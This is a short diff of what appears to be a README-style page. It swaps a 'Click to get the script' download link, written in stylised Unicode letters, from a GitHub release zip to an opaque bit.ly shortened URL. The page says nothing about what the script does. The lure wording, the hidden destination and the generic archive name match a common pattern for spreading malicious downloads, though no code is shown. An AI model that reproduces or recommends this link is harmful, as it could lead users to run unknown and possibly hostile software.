@@ -1,5 +1,5 @@
 
-# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://github.com/newcost686/az/releases/download/downl/Script.Github.zip)***
+# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://bit.ly/3CTlryV)***
 
 ![hq720](https://github.com/user-attachments/assets/0db0d7f6-4df4-475a-a85a-66c92d2aa1f0)
 
